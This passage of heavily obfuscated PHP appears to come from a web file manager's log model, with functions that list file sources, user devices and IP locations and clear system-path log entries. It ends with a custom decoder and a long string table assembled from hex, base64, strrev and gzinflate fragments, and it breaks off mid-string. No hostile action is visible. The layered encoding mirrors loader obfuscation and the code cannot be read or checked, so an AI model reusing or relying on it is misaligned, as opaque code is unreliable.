return; } $¶›ÕıÕ© = json_decode($¤‘ºÍØí[$é¯áÃîÌ[2286]], !0); foreach ($¶›ÕıÕ© as $¸£àßÅ›) { try { $Ó·‰³°— = IO::infoFull($¸£àßÅ›[$é¯áÃîÌ[84]]); } catch (Exception $ø‘›ûï•) { continue; } $¤‘ºÍØí[$é¯áÃîÌ[84]] = $¸£àßÅ›[$é¯áÃîÌ[84]]; $”ğÈÃÇâ[] = $¤‘ºÍØí[$é¯áÃîÌ[440]] = $Ó·‰³°—[$é¯áÃîÌ[440]]; $”ğÈÃÇâ[] = $¤‘ºÍØí[$é¯áÃîÌ[2089]] = $Ó·‰³°—[$é¯áÃîÌ[470]]; break; } return $¤‘ºÍØí; } private function getSourceList(&$ş÷ßÀòº) { $ùïì—ç¾ =& $_SERVER[”ú…±Ú¥]; $¹¤ÎÙœ = array(); foreach ($ş÷ßÀòº as $±üìóÙ => $ñÁô¯½”) { $‘ŠÇóéÜ = json_decode($ñÁô¯½”[$ùïì—ç¾[491]], !0); if ($ñÁô¯½”[$ùïì—ç¾[33]] == $ùïì—ç¾[1835]) { $‘ŠÇóéÜ = $this->descZipDownload($‘ŠÇóéÜ, $¹¤ÎÙœ); $ş÷ßÀòº[$±üìóÙ][$ùïì—ç¾[491]] = json_encode($‘ŠÇóéÜ); continue; } if (strpos($ñÁô¯½”[$ùïì—ç¾[33]], $ùïì—ç¾[2091]) !== 0) { if (!isset($‘ŠÇóéÜ[$ùïì—ç¾[84]]) || strpos($ñÁô¯½”[$ùïì—ç¾[33]], $ùïì—ç¾[2287]) !== 0) { continue; } try { $ÓÀšşÄ’ = IO::infoFull($‘ŠÇóéÜ[$ùïì—ç¾[84]]); } catch (Exception $åÅÅ“à°) { continue; } $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[440]] = $ÓÀšşÄ’[$ùïì—ç¾[440]]; $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[2089]] = $ÓÀšşÄ’[$ùïì—ç¾[470]]; $ş÷ßÀòº[$±üìóÙ][$ùïì—ç¾[491]] = json_encode($‘ŠÇóéÜ); continue; } $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[440]]; $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[2089]]; if ($‘ŠÇóéÜ[$ùïì—ç¾[33]] == $ùïì—ç¾[586]) { $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[491]][$ùïì—ç¾[1189]]; $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[491]][$ùïì—ç¾[1190]]; } if ($‘ŠÇóéÜ[$ùïì—ç¾[33]] == $ùïì—ç¾[2099]) { $¹¤ÎÙœ[] = $‘ŠÇóéÜ[$ùïì—ç¾[491]][$ùïì—ç¾[440]]; } } if (!$¹¤ÎÙœ) { return array(); } return Model($ùïì—ç¾[857])->sourceListInfo($¹¤ÎÙœ, !0); } private function logList($‰şé‘™) { $‰—ó•°— =& $_SERVER[”ú…±Ú¥]; $ÌÇÎäÔ¦ = array_to_keyvalue($‰şé‘™, $‰—ó•°—[12], $‰—ó•°—[1671]); $ÔØ‘æ”„ = Model($‰—ó•°—[563])->userListInfo(array_unique($ÌÇÎäÔ¦)); $Ïİ«Ö = $this->getSourceList($‰şé‘™); $â‘³îòì = $this->typeAll(); $ÎšÔÌóŞ = array(); $€‘×ôÊ = array(); foreach ($‰şé‘™ as $ÃŸÖÕÔê => $‘³¦–Ê²) { $ÁÍĞ×•ğ = $‘³¦–Ê²[$‰—ó•°—[33]]; $’ƒÆ«« = isset($ÔØ‘æ”„[$‘³¦–Ê²[$‰—ó•°—[1671]]]) ? $ÔØ‘æ”„[$‘³¦–Ê²[$‰—ó•°—[1671]]] : !1; $á£ê†Ô = strpos($ÁÍĞ×•ğ, $‰—ó•°—[2288]) === 0 ? LNG($‰—ó•°—[2289]) : LNG($‰—ó•°—[2284]); $‘³¦–Ê²[$‰—ó•°—[32]] = isset($’ƒÆ««[$‰—ó•°—[32]]) ? $’ƒÆ««[$‰—ó•°—[32]] : LNG($‰—ó•°—[2284]); $‘³¦–Ê²[$‰—ó•°—[570]] = isset($’ƒÆ««[$‰—ó•°—[570]]) ? $’ƒÆ««[$‰—ó•°—[570]] : $‰—ó•°—[12]; $‘³¦–Ê²[$‰—ó•°—[1571]] = isset($â‘³îòì[$ÁÍĞ×•ğ]) ? $â‘³îòì[$ÁÍĞ×•ğ] : $á£ê†Ô; $‘³¦–Ê²[$‰—ó•°—[2033]] = $’ƒÆ««; $ûá½õ¯í = json_decode($‘³¦–Ê²[$‰—ó•°—[491]], !0); $‘³¦–Ê²[$‰—ó•°—[2281]] = isset($ûá½õ¯í[$‰—ó•°—[2281]]) ? $ûá½õ¯í[$‰—ó•°—[2281]] : $‰—ó•°—[12]; $‘³¦–Ê²[$‰—ó•°—[2285]] = IpLocation::get($‘³¦–Ê²[$‰—ó•°—[2281]]); if (strpos($ÁÍĞ×•ğ, $‰—ó•°—[2091]) === 0 || isset($ûá½õ¯í[$‰—ó•°—[2089]])) { $ûá½õ¯í[$‰—ó•°—[87]] = $Ïİ«Ö[$ûá½õ¯í[$‰—ó•°—[440]]]; $ûá½õ¯í[$‰—ó•°—[2104]] = $Ïİ«Ö[$ûá½õ¯í[$‰—ó•°—[2089]]]; if ($ûá½õ¯í[$‰—ó•°—[33]] == $‰—ó•°—[586]) { $ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[1189]] = $Ïİ«Ö[$ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[1189]]]; $ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[1190]] = $Ïİ«Ö[$ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[1190]]]; } if ($ûá½õ¯í[$‰—ó•°—[33]] == $‰—ó•°—[2099]) { $ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[440]] = $Ïİ«Ö[$ûá½õ¯í[$‰—ó•°—[491]][$‰—ó•°—[440]]]; } if ($ûá½õ¯í[$‰—ó•°—[33]] == $‰—ó•°—[1830]) { $ûá½õ¯í[$‰—ó•°—[2104]] = $ûá½õ¯í[$‰—ó•°—[87]]; $ûá½õ¯í[$‰—ó•°—[2089]] = $ûá½õ¯í[$‰—ó•°—[2104]][$‰—ó•°—[440]]; $ûá½õ¯í[$‰—ó•°—[87]] = !1; $ûá½õ¯í[$‰—ó•°—[440]] = $‰—ó•°—[12]; } if ($ûá½õ¯í[$‰—ó•°—[87]] && $ûá½õ¯í[$‰—ó•°—[87]][$‰—ó•°—[449]] == $‰—ó•°—[1316]) { $€‘×ôÊ[] = $‘³¦–Ê²[$‰—ó•°—[437]]; unset($‰şé‘™[$ÃŸÖÕÔê]); continue; } if ($ûá½õ¯í[$‰—ó•°—[2104]] && $ûá½õ¯í[$‰—ó•°—[2104]][$‰—ó•°—[449]] == $‰—ó•°—[1316]) { $€‘×ôÊ[] = $‘³¦–Ê²[$‰—ó•°—[437]]; unset($‰şé‘™[$ÃŸÖÕÔê]); continue; } } $‘³¦–Ê²[$‰—ó•°—[491]] = $ûá½õ¯í; unset($‘³¦–Ê²[$‰—ó•°—[2290]]); $ÎšÔÌóŞ[] = $‘³¦–Ê²; } $this->clearSystemPathLog($€‘×ôÊ); return $ÎšÔÌóŞ; } private function clearSystemPathLog($î‚„Ô€) { $—”†äĞ =& $_SERVER[”ú…±Ú¥]; if (count($î‚„Ô€) == 0) { return; } $Ø€Óíı± = array($—”†äĞ[437] => array($—”†äĞ[7], array_unique($î‚„Ô€))); $this->where($Ø€Óíı±)->delete(); } public function deviceList($µ×¹û¡Î, $‡Í ˆ„ö = 0) { $ÎõàÜ =& $_SERVER[”ú…±Ú¥]; $ŒÄó™–ò = array($ÎõàÜ[1671] => $µ×¹û¡Î, $ÎõàÜ[211] => array($ÎõàÜ[1043], $‡Í ˆ„ö), $ÎõàÜ[33] => $ÎõàÜ[1804]); $œı¸­€÷ = array(); $Âû±ÙŞé = $this->field($ÎõàÜ[2291])->where($ŒÄó™–ò)->order($ÎõàÜ[2102])->limit(50)->select(); foreach ($Âû±ÙŞé as $¨ˆ™ìÙµ => $†‚‚‡±Õ) { if ($¨ˆ™ìÙµ > 0 && abs($†‚‚‡±Õ[$ÎõàÜ[211]] - $Âû±ÙŞé[$¨ˆ™ìÙµ - 1][$ÎõàÜ[211]]) < 5) { continue; } $—ÃÛş”Ş = json_decode($†‚‚‡±Õ[$ÎõàÜ[491]], !0); $†‚‚‡±Õ[$ÎõàÜ[2281]] = isset($—ÃÛş”Ş[$ÎõàÜ[2281]]) ? $—ÃÛş”Ş[$ÎõàÜ[2281]] : $ÎõàÜ[12]; unset($—ÃÛş”Ş[$ÎõàÜ[2281]]); $¸Ì·¬È€ = $this->deviceType($—ÃÛş”Ş[$ÎõàÜ[2092]]); if (isset($œı¸­€÷[$¸Ì·¬È€])) { continue; } $†‚‚‡±Õ[$ÎõàÜ[2285]] = IpLocation::get($†‚‚‡±Õ[$ÎõàÜ[2281]]); $†‚‚‡±Õ[$ÎõàÜ[491]] = $—ÃÛş”Ş; $œı¸­€÷[$¸Ì·¬È€] = $†‚‚‡±Õ; } return array_values($œı¸­€÷); } public function deviceType($ì£Åëş) { return $ì£Åëş; } } goto eáÆ·”¥éì; EÕ•§ê¥Õ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x94\xfa\x85\xb1\xda\xa5", "\327\217\303\223\350\310"); $_SERVER[”ú…±Ú¥] = explode("\x7c\x4\x7c\x1\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x14\x5a\xf6\x52\xa\x6d\x69\x69\x61\x30\x4\xdb\x89\x16\x67\x4f\x9c\x38\x89\x6c\xcb\xb6\x88\x2c\x39\x92\x9c\xcd\x76\x26\x23"."\151\154\215\55\151\344\231\221\267\44\24\2\224\262\4\112\131\133\102\201\2\55\133\22\326\100\11\320\122\150\201\122\240\224\7\245\5\372\27\110\102\330\176\132\166\50\205\167\227"."\163\227\31\311\360\277\357\275\357\173\201\104\167\237\173\317\75\367\334\163\317\75\347\334\217\36\277\365\207\27\75\271\176\337\365\173\257\337\373\372\263\237\371\315\173\17\322\360\372"."\x7d\xd0\xdf\x2f\xd3\xf0\x31\x67\xef\xbf\x17\xf9\x73\xf8\xd9\x67\xd5\xd5\x75\xcc\x39\x70\x5a\xec\xe0\xf3\x6e\xdf\xa2\x6d\xd5\x6e\xd2\x36\xc5\xa3\x8f\xfe\x31\x72\xc8\xe3\x37\x9d\x18\xde\x7d\xf5\xa3".base64_decode('47v33mv2EuviRlSY1m2kP0rRdBR9zLAdmyZkzGK/MUDDRpH+BulPdyJq6QXT0Wk0QA==')."\x7f\x54\xe8\x17\xf9\xd7\x1e\xce\x1b\x2c\x5f\x8d\xc5\x53\x6a\xb2\xbb\xab\x2b\x9c\x48\x41\xa1\x46\x39\xbf\x60\x66\x21\x54\xd2\x2c\xad\x0\xdf\x2f\xe9\x96\x8d\x7a\x23\x37\xa7\x96\xcc\x92\x5e\x74\xa5"."\210\204\254\346\150\151\315\206\226\132\233\325\326\160\127\64\276\112\115\255\352\12\103\211\264\72\134\326\255\161\32\43\301\244\243\131\116\312\50\350\274\304\250\305\373\325\34\156\217"."\304\224\124\42\24\113\206\132\122\221\170\214\46\267\304\73\73\43\251\312\364\104\74\32\155\16\265\54\255\314\351\112\204\332\73\103\12\352\137\136\127\215\142\277\131\247\254\245\71"."\x6b\x95\x7a\x1a\x68\x33\xf4\x7c\x96\x6\x8b\x1a\xeb\x8e\x33\x5e\x82\x50\x8a\x87\xd0\x34\x15\xcb\xf9\x3c\x8d\xc4\x78\x28\xab\xf7\x6b\xe5\x3c\x40\xab\x55\x8e\x94\x2c\xa3\xa0\xb1\x41\x2f\xd5\xc7\x79"."\52\15\150\145\307\64\212\31\32\11\217\71\226\46\322\121\137\63\150\242\365\42\64\225\14\107\303\55\51\5\167\120\151\113\304\73\25\230\204\202\146\73\272\245\254\350\10\47\302"."\12\356\164\123\55\31\153\255\2\370\22\103\240\120\102\321\250\62\131\13\216\136\50\261\146\150\235\52\215\305\23\255\341\204\322\274\112\21\20\312\230\205\202\131\14\240\126\320\114".base64_decode('OlJXw4kEDfgAvaMRPGkQibe1JcM8BoNbFkU9mQn46Ypl+/OOOqLlywxNh+hvLfzArw==')."\151\3\352\16\33\105\243\14\150\12\115\230\46\137\126\20\50\263\322\72\113\321\263\20\50\240\372\46\254\74\264\14\107\150\260\151\21\375\135\0\205\322\52\316\323\55\107\325\213"."\31\63\153\24\141\261\56\6\244\323\234\134\253\145\240\2\64\336\157\346\263\54\154\33\23\60\224\176\43\257\307\312\5\271\10\217\146\162\106\76\153\261\365\365\171\45\151\64\312"."\227\53\56\53\142\45\324\23\276\322\215\376\161\261\336\160\271\56\236\153\233\145\53\243\107\320\372\240\361\351\220\254\73\16\32\34\300\306\60\273\113\171\123\313\46\165\213\17\315".strrev('O¡zú@õ?ĞK=}§ÿç®°X‚VEÖÄ1’®èÂ«Gß'."\0".'Ê"´*Ó6±I–\'#²ñCPÛ0').strrev('BëÜ…óU`•ÊP,}Y¨£¤«gfuÎÍ9«‰4)D£iÚÀfÛ;!N1õWŸ=9').strrev('«64t¥YS¥Y)õj:é*$Z9Š	Y‹Ô”§ç'."\r".'"^Z37œº%„é˜ºl').strrev('ƒ],vßèã3A‹0Ç4do)Rµ<±8P›'."\r".'ÀÔ-¶iOÛ3¦Æ3¢y³OóÈX').base64_decode('Q5mMbtv+FrPoWGbeH8rnzVF/3DIGjGKjMhWILcpEi9qPCWAjrNSaBQpGHPyZqU1lpw==')."\337\77\217\255\100\136\332\322\212\166\277\156\371\303\260\62\32\25\324\131\116\5\131\261\126\303\56\231\266\201\273\327\250\150\216\243\145\162\230\202\210\346\233\76\247\274\121\314\33"."\x45\xbd\xa2\x6c\x78\xac\x64\x58\xba\xcd\xfa\xaa\xb4\x77\xa6\xa0\x11\xd4\xba\xee\xef\xb2\xb4\x81\x82\xd6\xa8\x94\xca\x69\x4\x19\x58\xa9\x55\xd2\x68\x69\x0\x4d\xa3\x92\xc1\x51\x9f\x52\x28\xdb\x8e".strrev('éj”3µac’ÚHÔº¥HíMXQÔ ¥˜lÏ$6(‰?¬ô2ºñ;ûô@vĞ2)Òß')."\x80\x6e\x3b\xda\x0\xeb\x73\x14\xd1\x61\xde\x24\x4b\x5c\xe9\x47\xeb\xb\x23\x57\xc\x8d\x55\x24\x76\x99\xa3\xba\x85\x3e\xdc\x3c\xde\xa8\xc\x99\xd9\xb4\x39\x16\x60\x59\xb8\x70\x12\x11\x1a\x56\x18".base64_decode('T3fJ8Se04gCGT3rc0QEF7ZEBN6CjenHAybGKyXBieTihJuNtqRWhBGzmRYQlY+xTuA==').base64_decode('6bw/oWcR6DMOq6eVMNRYGbw48FyxXLxgWF400o4B0+q3USG/XIq1HTUKBu67w3MIJA==')."\321\116\337\16\35\12\222\1\65\365\332\123\353\172\263\323\352\375\350\337\251\365\75\275\255\201\251\175\213\203\206\250\23\234\36\230\256\314\150\230\243\164\41\326\303\320\362\12\14".base64_decode('uqJEgxJf6gaLwOaiWdQ/Bzh475KWvQesNDERXtYdTqbUznCqI94KXw+HIBQ16bJlow==').base64_decode('7aE/fTC7ffRHNew2aVvBUU5+VDM9iCajU2c0tp/S6EhBG5CIPE7FsU7T0t0pYqtaYQ==')."\x64\xf9\x1e\x81\xa2\x1d\xba\x31\x90\x3\x78\x19\xb8\xb5\x8c\x99\x37\x2d\x2d\x8f\x29\x23\x5b\x14\x3a\xa3\x56\x3\x6\x50\x2b\x20\xc2\x22\x92\x34\xa\x25\xd6\x59\x27\x57\x2e\xa4\xa5\x20\x50\x7b\x87".base64_decode('71Q2wiQWzpl8ZzMtCDUGocqUGW0wfq0fFkCk6E0RA1UHdAfv43h+YDU0h5KRFrUrlA==')."\xea\xe0\x44\x34\x68\x67\x87\xec\xa0\x66\xa1\x1d\x79\x4\x6d\xac\xe9\x20\xde\x61\x30\xc3\x1b\xe0\x34\xf8\x40\xfa\x33\x8b\x6d\xdd\x7a\x66\x48\xd5\xd2\xa8\x7f\xc\x9\xca\x98\x5e\xd\xc9\x3d\x61\xfb"."\123\60\71\23\375\57\66\243\254\131\320\130\263\204\50\353\131\112\225\151\322\124\127\116\207\256\11\266\302\261\34\23\247\132\256\42\10\5\162\46\364\2\15\27\100\127\346\60\144"."\xd0\xcc\xea\x79\x9d\xcd\x5f\x4e\x67\x1b\x5b\x3\x14\x43\x1b\x33\x9f\x5d\xd1\x7b\xc4\x9f\xa2\x54\xc1\x51\x18\x76\x2\xd5\xc4\xdb\x10\x8b\xaf\xc0\xc\xbd\x48\xc8\xa3\x9d\x34\x4e\x30\x53\xc4\xbb\x2c".base64_decode('vd8AYlJEmNOpWUNsDAhTBE7jiITvbd3RqNoSj6UQ609TViQiqTBbX6FWNdTSxRkEgQ==')."\x79\x50\x0\x13\xc2\xca\x5d\x8e\xa6\x8c\xcc\x0\xc\x44\xdd\x9\x8a\xed\x18\xed\x2c\x25\xb3\x68\xeb\x7e\x40\x19\xbf\x38\x22\x54\x64\x65\xc5\x6e\x5\x88\x24\x76\x38\xcf\xa6\x35\xe6\xd7\xa\x13\xfe".base64_decode('Alqqft5RN6+gpGSWIwJzIzYhDEZ0emM43BVPQoXFOBUximndgo91dUNWQcKL9nCKMQ==')."\x1c\x1a\xf0\x7d\xa1\x15\x49\xb6\x73\x94\x51\x41\xcb\x98\xd0\xc4\x58\x16\xb3\x8e\xb0\x11\x14\xf2\x82\xe1\x74\xf\xc7\x2f\x40\x8e\x9a\x9c\xe5\xef\xe8\xc\xb5\xf8\x93\x1d\xa1\x19\xb3\xe7\xd0\xd4\x55".base64_decode('hWxvqsOwe1fzOABs1J6lWjo6KbKWZzRMZ/QFbfNSf1b5C37cCoZVoKGhgbU1bY6SQw==')."\154\55\40\253\131\314\222\371\0\50\245\313\231\41\266\36\264\14\343\270\360\221\324\366\217\32\214\344\35\317\231\323\343\53\361\344\170\67\155\207\46\312\204\263\122\265\14\376\230".base64_decode('ilp0yrYMGrRqsqiSwRhJmqrlBxCUnVxBThRTTOM65W/4ZHEoYthW227YKkeszTjbUw==').strrev('7§*Å±'."\r".'jîïLª™ĞÄTpÖñª–Äˆê’Ù(Ñm’heeaôô¬>µeaõ«').base64_decode('xxnlhdRutEsuD0Uj3uLhlZFkKlk1C6V1hz05rc1qVyLcFlnJo22RcLQ1qbaEWjpEmQ==').base64_decode('WKgTImo/FgrYQXd5FW33SS5aUEewmMTkO4x8mlfZOVUVVAKxdToAHIaLhTNkJCpD0g==')."\62\143\106\370\221\246\300\150\177\101\3\62\251\61\226\255\216\376\324\53\241\244\342\224\124\116\345\323\343\74\110\206\301\342\350\360\2\337\127\200\365\250\350\201\212\313\64\353\375"."\234\43\250\236\20\352\167\70\343\341\211\43\362\46\362\320\14\204\210\24\10\141\2\231\21\370\214\201\210\245\345\204\130\167\372\205\4\106\215\167\205\23\41\54\277\121\127\44\342"."\xb1\x76\xa8\x30\x9a\xd3\x59\x7\x22\x0\xfe\x3a\xc6\xe6\x83\x18\xc7\x11\x1b\xd\xe2\xd1\x35\x76\x9e\x17\x40\x1f\x34\x19\x28\xd7\xd3\x9f\x13\x80\x14\xa0\x3\x21\x50\x96\x22\x83\x7a\x1a\xef\xb9\x8c"."\xcf\x61\x81\x7e\x44\xf6\xd8\x7e\x69\x96\xf9\xd7\xd2\xa6\x99\x67\x94\x18\x71\xaa\x7c\x4b\xe0\x62\xa0\x41\x9b\x21\xc9\x18\xdb\x4c\xa6\x71\x52\x6\xa8\x1b\x5f\x1a\x8e\xa9\xc\xb3\x68\x4c\xc2\x46\x9a"."\20\116\44\342\11\0\210\143\16\61\351\0\315\114\204\223\214\216\143\262\151\60\160\5\3\323\0\213\165\304\132\300\347\203\153\172\107\247\325\365\370\247\5\372\120\240\176\352\22"."\x1a\x85\x58\x6f\xc0\x15\x3d\x1e\xea\x97\x2d\x5e\x1b\x33\xf0\x75\xf6\xe2\xfa\xc6\xde\x60\x6f\xb0\x6e\x71\x63\x4f\xc8\x3f\xa1\xf9\x27\x1a\xfc\xf3\xfd\x7d\xd3\x7a\x3\xf5\xd3\x20\xa1\x6f\xdd\xc\xdf"."\xac\xd\xb8\x0\x2a\xb8\xf8\xb8\x3e\xf4\xd3\xd4\xbb\x78\x4a\xaf\xff\x84\x93\xd6\x2e\xe9\xe9\xed\xab\x6d\x9c\x76\x6c\x6f\xe0\xb8\xde\xd1\xbe\xa9\xf5\x8b\xd9\x77\x32\x65\xcb\xd2\x8b\x8c\x62\xa1\xae"."\146\247\325\241\56\41\306\236\27\51\222\115\115\52\300\62\46\214\222\110\135\67\147\3\113\107\163\250\17\210\32\75\376\336\151\175\213\245\172\122\222\367\133\210\222\242\35\66\307"."\xcb\x85\xfc\xab\xf1\xc8\x78\x55\xbc\xee\x1\x3f\xca\xc5\x8c\xd8\x96\xf0\xba\x48\x6b\x19\xa0\x3\x88\x46\xf2\x25\x84\x78\x35\x2e\x31\x72\x9f\x27\xd7\x4d\xa1\xbf\x1b\xd8\x44\xe\xe8\x63\x7c\xff\xea"."\67\54\300\316\162\321\30\146\2\261\242\76\14\1\323\141\370\235\326\235\121\235\241\7\112\167\305\21\162\60\272\217\262\244\130\136\332\63\310\321\136\332\156\31\113\127\122\61\257".base64_decode('P8pjaBuBeToAStsZraQnpRGqairUHA2rjMIAJWZxQhWbufAYDU1QVEYfMuIwSc7NsA==')."\362\355\341\274\102\10\203\242\133\226\151\65\22\71\272\135\56\341\243\201\202\146\34\301\126\101\33\270\322\264\110\241\40\207\172\252\74\1\45\215\161\202\130\356\243\213\105\217\51"."\24\364\251\44\146\310\106\214\62\343\137\203\165\275\275\345\36\75\333\327\203\20\137\363\367\367\255\233\271\241\236\235\67\203\275\350\17\213\204\252\110\164\125\116\15\125\304\201\5".base64_decode('cD+4UM8V4dk0alqcCS65jnOO6Wh5VxMpnMJIE+OjQLxFZzsqKBbm2SRROCGnMS5O4g==')."\214\220\44\213\305\65\222\272\23\340\45\174\122\246\212\342\256\153\211\246\32\106\354\213\150\71\265\110\133\35\25\62\46\307\155\107\57\270\344\347\266\216\317\135\155\345\174\336\341".base64_decode('h8q8MQRfgLUC4nw/7AbTqlVtMy0mm5kK3aiZWq1gpFg0s2kZ1cQm2x5C7ExKqWOiZw==')."\x25\x12\x53\x9a\xe3\xf1\x68\x38\x14\x53\xf0\x7e\xe\xfb\x10\x62\x16\x92\xe1\xae\x10\xda\xc4\xb0\x94\x27\x99\xa\x83\x34\x3c\xd2\xea\x67\xed\xae\xf4\x47\xe0\xac\xcf\x3\x6\x80\xdd\x2c\x51\xbe\x11"."\x1d\x4d\xd1\x99\x7a\x88\xcd\x25\x22\x88\xe\x2b\xa\xb2\x5a\x88\xe1\xa3\x84\xf\xcb\x2a\x7d\x98\xd3\xf0\xa1\x31\xf8\xf0\x41\xdd\x27\x4e\x67\x3e\x21\xfa\xf5\x8d\x18\xfa\x28\x9\xf0\xe3\x94\xf\x4e".base64_decode('WT7E+yKGAbO3EIy0+gy7lRwMyQdIFuuQk8MSubw27qOdi+ojet7HuuZjPfYxKYWPiA==').base64_decode('FlqhW91ocUG3SBDR0JwPoxPGZp8QRvvM0aJukSIAJnGm9Inzpm/AMsulLvZNKUa7BQ==').base64_decode('CaLPPCFhmo6PST18skAEehFiq6YqOKuPhsDf2wmYO5xVCaUvmKzK+XALf9bRFkG6tA==').base64_decode('ge15rjJietkyzOsihidAhJaLZYwH1KaNyJhXDQvZzsPQWMihxQ2E4IS9kgPv3QT+aA==')."\112\33\110\112\237\163\264\1\366\55\114\312\120\356\244\105\151\70\241\147\306\63\102\24\321\52\11\70\334\61\367\342\52\243\366\222\132\277\147\220\76\262\312\252\255\220\352\30\300".base64_decode('sZ5P2IEHHMAgzpYCn33XCvritQujJOQyXhIMB+0sJtlJtAG25RmIZsjZQKx97hheeg==')."\1\102\274\311\5\137\222\313\326\242\341\266\224\162\142\34\121\72\303\124\151\35\25\27\126\310\77\146\121\161\265\315\300\245\64\221\174\21\327\212\131\232\262\26\355\12\153\233\152"."\xd8\x47\x6a\x5c\xd5\x5\xd2\xb8\x3b\xe1\x63\x51\xa5\x12\xd\x31\xb8\x65\x20\x60\xe4\x20\xc3\x17\x3b\x19\x4b\x8a\x8b\x8d\xb3\xc\x5c\xa2\x66\xc3\x79\xd\x5f\xd8\x40\x48\x67\x69\x62\x6a\x65\x2c\x95"."\210\221\110\140\375\162\175\27\107\305\12\143\50\241\340\17\370\44\276\6\23\34\277\130\53\122\324\15\162\17\106\172\266\133\14\242\56\243\70\156\24\145\331\252\110\25\73\266\140"."\x18\xf0\x52\xf7\x48\x83\x5b\x27\xb\xd3\x2d\x46\xc8\x6e\x7d\x20\xd3\xf5\x61\xc9\xa6\xb4\x99\xb\x81\x1d\xea\x3d\x91\xb2\x16\x5c\x52\xe8\xca\x9e\x33\xa2\xeb\x77\x2d\x68\x40\xf2\x9c\x66\x9\xf8\x31"."\x32\x84\x69\x81\x10\x52\xe3\x22\x22\x2a\x15\xeb\xd7\x46\x4\xff\xe2\xaa\x23\x11\x13\xdb\x19\x67\x1d\x96\x83\xee\x46\x69\xb4\xd5\x47\x7e\x3b\xd0\xc0\xe5\x15\xca\x67\x4\x93\xe\x56\x88\xd2\x20\xb4"."\374\243\10\74\350\207\14\44\145\372\260\124\33\375\320\135\236\135\253\222\102\14\325\313\205\126\270\74\304\341\345\150\315\63\266\15\301\270\216\321\14\340\65\124\111\142\300\151\216"._kodDe('LJKNkMMqdjlvGK3lzApa6KOma0vHrvPMNnjj4RdgBxVwlZs1I8MvpExBFB8gdLboin0=')."\xbd\x82\xc1\x55\xac\x30\x1\x6b\xb1\x9c\x6\x44\x87\x30\x68\xd5\xca\x7e\x60\x4\xae\x1e\x6f\xb3\x4c\xce\x7\xf3\x6d\xdf\x5b\xa8\x85\x1c\x34\xf9\x4d\xb9\x67\xab\x96\xe0\xe1\x62\x2f\x2a\x92\xa4\x3a"."\136\106\303\223\352\211\212\211\160\355\63\64\211\135\152\150\331\202\121\14\130\164\67\13\240\343\3\150\67\370\32\44\136\114\220\231\165\66\331\27\140\367\333\340\231\147\307\64\321"."\x99\xd4\xa\x58\xe8\xcb\xa2\x43\x12\x89\x3\xfa\x40\x2e\xbf\xf1\x36\x28\x73\x10\xbc\x15\x1b\x65\x48\xc4\xda\xcd\x28\xb1\x9a\xc9\x92\xc6\x68\x34\x9c\x38\xca\xfc\x33\x9c\xab\x3\x2a\x65\x64\x86\xc4"."\x4a\xd5\x46\x34\x84\x7f\xd0\x34\x19\x8c\xa4\xa6\x40\xe2\x51\xce\x18\x63\xda\x11\xce\x1a\xe\x4e\xc1\x8b\xd1\x64\x37\x1b\xa2\xa0\xd8\x31\x45\x9a\x4c\xb2\xc9\xce\x53\x31\xf9\xe2\x94\xe1\x9b\xe2\x2a".strrev('K+ëB="IñJ•%”¶iE#‘%˜í€Ä¥ÑÁS¦’€K1‘ğ®©Õ‚ÒÙ*q æé')."\30\146\1\62\122\26\352\222\263\67\135\302\1\174\332\10\310\164\72\144\131\14\201\351\60\361\165\42\112\224\223\60\55\114\262\325\127\155\273\242\215\207\107\204\36\23\155\12\177"."\x38\x40\x97\x7f\x40\xcb\x66\xe3\xec\x4a\x55\xe\x57\x16\x95\xe5\x90\xd5\x1b\x22\x4a\x65\xbc\x29\x29\x56\xbd\x78\x28\x9f\x17\x8a\x28\xde\xf8\xa4\x55\xe8\xb2\x97\x2b\xc9\x29\x93\x56\x6b\x23\x7\x5f"."\x76\x27\x58\x2d\x8d\x1f\x72\xe4\x65\xe7\x66\xd4\xbd\x6c\xbc\x9b\x54\x4f\xce\xb2\x4c\x42\xe4\xc4\x34\x56\x8f\xa3\x5d\xbe\x25\x67\x14\x75\x9b\x6f\xd6\x96\x5d\x8d\x66\xfd\x7f\xe6\x8d\x2b\x21\x8f\x57"."\xc8\x64\xe8\x82\xf3\x24\x89\x35\xd6\xa7\x1c\xd1\xe5\x13\x4\x17\xcb\xa\x92\xc5\xb7\xf0\xa\xc6\x4\x98\x3\x29\xa2\x3a\x2e\x96\x2a\x41\xda\x97\x96\x93\xb\x43\xd0\xf2\xa5\xf0\xc0\x5b\x56\x24\x1e"."\xb0\x27\xc1\x59\x6f\x39\x9d\x9\xad\x9\xd\x1c\xe3\x3b\xad\x5c\x9\x67\xe1\xb9\x9c\xac\x51\x9e\xcf\x1b\x13\xec\x9b\x5c\xe\xe1\x2a\xce\x98\xac\x19\x96\xcd\x5b\xb9\xe3\x86\xd3\x9e\xfc\xc3\x73\x34"."\xfc\xc4\x79\x27\x5f\x75\xd6\x7f\x68\x78\xf6\x2c\x50\xc9\x5b\xff\x25\xf4\xdf\x97\x69\x58\x28\xd0\x9e\xbe\x72\x9d\x79\xd4\x43\x87\xed\x77\xe0\xbb\xeb\xe6\xdd\xd2\x59\x37\xd8\x71\x7e\xcd\x94\xb3\x3a"."\xbb\x2f\x7d\xa9\xe5\xe7\xad\x67\xc6\x23\xdb\x9f\xff\xf0\xe6\x7b\x9e\x3b\x2e\xfe\xfc\x8e\xa6\xff\x7e\xf3\xcc\xf3\x3e\x3e\xe6\xea\xc2\x4b\